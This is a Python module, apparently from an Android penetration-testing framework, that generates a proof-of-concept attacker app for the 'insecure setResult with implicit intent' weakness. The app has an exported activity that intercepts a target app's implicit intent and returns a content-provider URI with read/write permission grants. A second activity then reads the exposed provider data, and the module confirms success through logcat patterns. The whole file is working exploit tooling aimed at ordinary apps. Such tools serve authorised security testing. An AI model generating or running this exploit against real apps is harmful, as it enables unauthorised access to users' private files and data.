from modules.android.app.app import App
from modules.android.app.template import Template
from settings.logger import get_logger
from state.options import option_state
from state.opt_bool import OptBool
from state.opt_enum import OptEnum
from state.opt_list import OptList
from state.opt_str import OptStr


log = get_logger(__name__)


class SherlockModule(App):

    def __init__(self):
        super().__init__()
        self._id = "insecure_set_result_implicit"
        self._template = Template()


    def register_options(self):
        option_state.add_options([
            OptBool("VIA_DEEPLINK", [True, "Communicate to target via deeplink", False]),
            OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
            OptEnum("PROVIDER_TYPE", [True, "Content provider type (1: Share content, 2: Access to files)", 1, [1, 2]]),
            OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
            OptStr("TARGET_PACKAGE", [True, "Target package name"]),
            OptStr("TARGET_CLASS", [True, "Target class name"]),
            OptStr("INTENT_ACTION", [True, "Action name to intercept"]),
            OptList("INTENT_EXTRA", [False, "Intent extra data"]),
            OptList("INTERCEPT_EXTRA", [False, "Intercept ntent extra data"]),
            OptEnum("RESULT_CODE", [True, "Result code returned to the caller", -1, [-1, 0, 1, "RESULT_OK", "RESULT_FIRST_USER", "RESULT_CANCELED"]])
        ])
        self.update_option_status()


    def update_option_status(self):
        opts = option_state.get_all_options()
        stat_dict = {
            "via_deeplink": {
                "pos": ["deeplink_uri"],
                "neg": ["target_class"]
            }
        }
        super().update_option_status(stat_dict, opts)


    def execute(self):
        opts = self.get_options_value()

        manifest = [
            self._template.build_manifest_component(
                self.activity_name(self._id, opts['TARGET_PACKAGE'])
            ),
            self._template.build_manifest_component(
                self.intercept_activity_name(self._id, opts['TARGET_PACKAGE']),
                is_exported=True,
                intercept=True, 
                action=opts['INTENT_ACTION']
            )
        ]

        exploit_activity = self._template.build_activity(
            name=self.activity_name(self._id, opts['TARGET_PACKAGE']),
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.database.Cursor",
                "android.net.Uri",
                "android.os.Bundle",
                "android.util.Base64",
                "android.util.Log",
                "androidx.activity.result.ActivityResultLauncher",
                "androidx.activity.result.contract.ActivityResultContracts",
                "androidx.appcompat.app.AppCompatActivity",
                "java.io.BufferedReader",
                "java.io.FileNotFoundException",
                "java.io.IOException",
                "java.io.InputStream",
                "java.io.InputStreamReader",
                "java.nio.charset.StandardCharsets"
            ],
            bind_button=True,
            on_create=[self._template.build_intent(
                set_action="android.intent.action.VIEW" if opts['VIA_DEEPLINK'] else None,
                set_data=f"\"{opts['DEEPLINK_URI']}\"" if opts['VIA_DEEPLINK'] else None,
                put_extra=[[extra[0], f"\"{extra[1]}\""] for extra in opts['INTENT_EXTRA']] if opts['INTENT_EXTRA'] != "" else [],
                set_classname=[opts['TARGET_PACKAGE'], opts['TARGET_CLASS']] if not opts['VIA_DEEPLINK'] else [],
                start_activity=False,
                start_for_result=True
            )],
            listener=[
                self._template.build_start_for_result_launcher(
                    opts['RESULT_CODE'],
                    process_result=[
                        self._template.resolve_content(opts['PROVIDER_TYPE'])
                    ]
                )
            ]
        )

        intercept_activity = self._template.build_activity(
            name=self.intercept_activity_name(self._id, opts['TARGET_PACKAGE']),
            libs=[
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            on_create=[self._template.build_intent(
                set_data=f"\"{opts['PROVIDER_URI']}\"",
                put_extra=[[extra[0], f"\"{extra[1]}\""] for extra in opts['INTERCEPT_EXTRA']] if opts['INTERCEPT_EXTRA'] != "" else [],
                set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"],
                start_activity=False,
                set_result=True,
                result_code=opts['RESULT_CODE']
            )],
            finish=True
        )

        component = [
            {
                "name": f"{self.activity_name(self._id, opts['TARGET_PACKAGE'])}.java",
                "content": exploit_activity
            },
            {
                "name": f"{self.intercept_activity_name(self._id, opts['TARGET_PACKAGE'])}.java",
                "content": intercept_activity
            }
        ]

        app = {
            "manifest": manifest,
            "layout": self._template.button_layout(self._id, opts['TARGET_PACKAGE']),
            "bind_button": self._template.bind_button(self._id, opts['TARGET_PACKAGE']),
            "component": component
        }

        stat = {
            "failed": [
                {
                    "regex": r"^.*java\.lang\.SecurityException:.*$",
                    "msg": r"java\.lang\.SecurityException:.*"
                },
                {
                    "regex": r"^.*java\.lang\.NullPointerException:.*$",
                    "msg": r"java\.lang\.NullPointerException:.*"
                },
                {
                    "regex": r"^.*java\.lang\.RuntimeException:.*$",
                    "msg": r"java\.lang\.RuntimeException:.*"
                }
            ],
            "succeed": {
                "regex": r"^.*ELEMENTARY!!!.*$",
                "data": r"Data:.*"
            }
        }

        build_app = self.build(app)
        if not build_app:
            log.error("Module failed to execute, terminating module..\n")
            return

        self.check_logcat(stat)


# DONE
# RETESTED